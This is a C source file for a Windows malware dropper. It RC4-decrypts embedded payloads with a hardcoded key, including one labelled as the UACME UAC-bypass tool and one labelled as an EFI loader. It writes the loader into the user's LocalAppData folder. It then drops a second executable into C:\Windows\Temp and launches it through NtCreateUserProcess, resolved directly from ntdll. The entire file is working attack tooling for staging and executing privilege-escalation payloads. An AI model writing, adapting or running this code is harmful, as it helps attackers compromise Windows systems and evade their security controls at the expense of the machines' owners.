#include "main.h"

void Rc4Crypt(unsigned char* Data, long DataLen, unsigned char* Key, int KeyLen) {
    unsigned char S[256];
    int i, j = 0;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        S[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + Key[i % KeyLen]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    i = 0;
    j = 0;
    for (long k = 0; k < DataLen; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        Data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

BOOL DropFileOnly(unsigned char* PData, DWORD DwSize, LPCWSTR LpFileName) {
    DWORD BytesWritten = 0;
    HANDLE HFile = CreateFileW(LpFileName, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (HFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file (%ls): %lu\n", LpFileName, GetLastError());
        return FALSE;
    }

    if (!WriteFile(HFile, PData, DwSize, &BytesWritten, NULL) || BytesWritten != DwSize) {
        printf("[-] Write failed (%ls): %lu\n", LpFileName, GetLastError());
        CloseHandle(HFile);
        return FALSE;
    }

    CloseHandle(HFile);
    printf("[+] Payload written to disk (will not execute): %ls\n", LpFileName);
    return TRUE;
}

BOOL DropAndExecute(unsigned char* PData, DWORD DwSize, LPCWSTR LpFileName, LPCWSTR LpArgs) {

    HMODULE Hntdll = GetModuleHandleW(L"ntdll.dll");
    if (!Hntdll) { 
        printf("[-] Failed to find ntdll.\n"); 
        return FALSE; 
    }
    pfn_RtlInitUnicodeString         PRtlInit =
        (pfn_RtlInitUnicodeString)GetProcAddress(Hntdll, "RtlInitUnicodeString");
    pfn_RtlCreateProcessParametersEx PRtlCreate =
        (pfn_RtlCreateProcessParametersEx)GetProcAddress(Hntdll, "RtlCreateProcessParametersEx");
    pfn_RtlDestroyProcessParameters  PRtlDestroy =
        (pfn_RtlDestroyProcessParameters)GetProcAddress(Hntdll, "RtlDestroyProcessParameters");
    pfn_NtCreateUserProcess           PNtCreate =
        (pfn_NtCreateUserProcess)GetProcAddress(Hntdll, "NtCreateUserProcess");

    if (!PRtlInit || !PRtlCreate || !PRtlDestroy || !PNtCreate) {
        printf("[-] Failed to find ntdll exports.\n");
        return FALSE;
    }

    /* They are created fresh on each call, "static" was removed */
    WCHAR SzFilePath[MAX_PATH] = { 0 };
    WCHAR SzNtPath[MAX_PATH + 8] = { 0 };
    WCHAR SzCommandLine[1024] = { 0 };

    /* Use the external path */
    wcscpy_s(SzFilePath, MAX_PATH, LpFileName);
    swprintf_s(SzNtPath, MAX_PATH + 8, L"\\??\\%s", SzFilePath);

    printf("[*] File path: %ls\n", SzFilePath);
    printf("[*] NT path:   %ls\n", SzNtPath);

    /* Write to disk */
    DWORD  BytesWritten = 0;
    HANDLE HFile = CreateFileW(SzFilePath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (HFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file: %lu\n", GetLastError());
        return FALSE;
    }
    if (!WriteFile(HFile, PData, DwSize, &BytesWritten, NULL) || BytesWritten != DwSize) {
        printf("[-] Write failed: %lu\n", GetLastError());
        CloseHandle(HFile);
        return FALSE;
    }
    CloseHandle(HFile);
    printf("[+] Payload written to disk: %ls\n", SzFilePath);

    /* CommandLine */
    if (LpArgs && LpArgs[0])
        swprintf_s(SzCommandLine, 1024, L"%s %s", SzFilePath, LpArgs);
    else
        swprintf_s(SzCommandLine, 1024, L"%s", SzFilePath);
    printf("[*] Command: %ls\n", SzCommandLine);

    /* UNICODE_STRING - Win32 path for RtlCreate */
    NT_UNICODE_STRING UsImagePath = { 0 };
    NT_UNICODE_STRING UsCmdLine = { 0 };
    NT_UNICODE_STRING UsNtImagePath = { 0 };

    PRtlInit(&UsImagePath, SzFilePath);
    PRtlInit(&UsCmdLine, SzCommandLine);
    PRtlInit(&UsNtImagePath, SzNtPath);

    NT_UNICODE_STRING UsDesktop = { 0 };
    PRtlInit(&UsDesktop, L"WinSta0\\Default");

    PNT_RTL_USER_PROCESS_PARAMETERS PProcParams = NULL;
    NTSTATUS Status = PRtlCreate(
        &PProcParams,
        &UsImagePath,
        NULL, NULL,
        &UsCmdLine,
        NULL,        // Environment
        NULL,        // WindowTitle
        &UsDesktop,  // DesktopInfo
        NULL, NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );
    if (!NT_SUCCESS(Status)) {
        printf("[-] RtlCreateProcessParametersEx: 0x%08X\n", Status);
        return FALSE;
    }
    printf("[+] ProcParams OK: %p\n", PProcParams);

    PProcParams->WindowFlags = STARTF_USESHOWWINDOW;
    PProcParams->ShowWindowFlags = SW_SHOW;

    /* CreateInfo */
    NT_PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(NT_PS_CREATE_INFO);
    CreateInfo.State = PsCreateInitialState;

    /* AttributeList */
    PNT_PS_ATTRIBUTE_LIST PAttrList = (PNT_PS_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(NT_PS_ATTRIBUTE_LIST));
    if (!PAttrList) {
        printf("[-] HeapAlloc failed.\n");
        PRtlDestroy(PProcParams);
        return FALSE;
    }

    PAttrList->TotalLength = sizeof(NT_PS_ATTRIBUTE_LIST);
    PAttrList->Attributes[0].Attribute = NT_PS_ATTRIBUTE_IMAGE_NAME;
    PAttrList->Attributes[0].Size = UsNtImagePath.Length;
    PAttrList->Attributes[0].Value = (ULONG_PTR)SzNtPath;

    /* Create process */
    HANDLE HProcess = NULL, HThread = NULL;
    Status = PNtCreate(
        &HProcess, &HThread,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
        NULL, NULL,
        0, 0,
        PProcParams,
        &CreateInfo,
        PAttrList
    );

    HeapFree(GetProcessHeap(), 0, PAttrList);
    PRtlDestroy(PProcParams);

    if (!NT_SUCCESS(Status)) {
        printf("[-] NtCreateUserProcess: 0x%08X\n", Status);
        return FALSE;
    }

    printf("[+] Process started. PID: %lu\n", GetProcessId(HProcess));
    CloseHandle(HThread);
    CloseHandle(HProcess);
    return TRUE;
}

int main() {
    WCHAR SzPayloadPath[MAX_PATH];
    unsigned char Key[] = "S3cr3t_K3y_2026!";
    int KeyLen = strlen((char*)Key);

    /* Determine the CPU Architecture */
    SYSTEM_INFO SI;
    GetNativeSystemInfo(&SI);
    switch (SI.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        goto DropTheFile;
    
    /* Disable the other architectures */
    default:
        printf("[-] Unsupported architecture.\n");
        return 1;
    }

DropTheFile:
    /* Decrypt UACME in memory */
    Rc4Crypt(payload_exe, payload_size, Key, KeyLen);

    /* Decrypt the Loader in memory */
    Rc4Crypt(LoadEfiPayload, LoadEfiPayloadSize, Key, KeyLen);

    /* Expand %LOCALAPPDATA% environment variable to get the real path */
    DWORD DwRet = ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\loadefi.exe", SzPayloadPath, MAX_PATH);

    if (DwRet == 0 || DwRet > MAX_PATH) {
        printf("[-] Failed to create dynamic path. Error code: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Dynamic Target Path: %ls\n", SzPayloadPath);

    /* Drop the Loader to Appdata/Local */
    if (DropFileOnly(LoadEfiPayload, LoadEfiPayloadSize, SzPayloadPath)) {
        printf("[+] Payload successfully written to AppData.\n");
    }
    else {
        printf("[-] Failed to write payload.\n");
        return 1;
    }

    /* Drop and execute the UACME */ 
    if (DropAndExecute(payload_exe, payload_size, L"C:\\Windows\\Temp\\payload1.exe", NULL)) {
        printf("[+] First operation completed successfully!\n\n");
    }
    else {
        printf("[-] Error occurred during first operation.\n\n");
        return 1;
    }

    return 0;
}